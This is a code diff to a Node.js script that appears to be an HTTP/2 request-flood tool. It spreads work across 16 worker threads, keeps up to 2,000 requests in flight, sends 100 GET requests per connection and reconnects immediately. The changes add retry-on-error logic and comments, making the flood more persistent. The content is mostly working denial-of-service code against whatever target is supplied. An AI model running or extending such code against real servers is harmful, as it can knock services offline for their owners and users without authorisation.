@@ -5,7 +5,7 @@ const readline = require('readline');
 const net = require('net');
 
 const THREADS = 16;
-const INITIAL_CONNECTIONS =25;
+const INITIAL_CONNECTIONS = 25;
 const POWER_MULTIPLIER = 3;
 const WARMUP_TIME = 10000;
 const MAX_INFLIGHT = 2000;
@@ -96,17 +96,20 @@ if (isMainThread) {
             inflight.count++;
             const req = client.request({ ':path': '/', ':method': 'GET' });
             req.setNoDelay?.(true);
+
             req.on('response', () => {
                 sendStat('ok');
                 inflight.count--;
             });
+
             req.on('error', () => {
                 sendStat('err');
                 inflight.count--;
             });
+
             req.end();
             sendStat('req');
-        } catch {
+        } catch (error) {
             inflight.count--;
             sendStat('err');
         }
@@ -118,17 +121,24 @@ if (isMainThread) {
         let client;
         try {
             client = http2.connect(target);
-            client.on('error', () => {});
+            client.on('error', () => {
+                // Retry on error
+                setTimeout(createConnection, 250);
+            });
+
             client.on('close', () => setTimeout(createConnection, 100));
+
             client.on('connect', () => {
                 const inflight = { count: 0 };
                 for (let i = 0; i < 100; i++) sendOne(client, inflight);
             });
-        } catch {
+        } catch (error) {
+            // Retry connection if it fails
             setTimeout(createConnection, 250);
         }
     }
 
+    // Start connections
     for (let i = 0; i < connections; i++) {
         createConnection();
     }
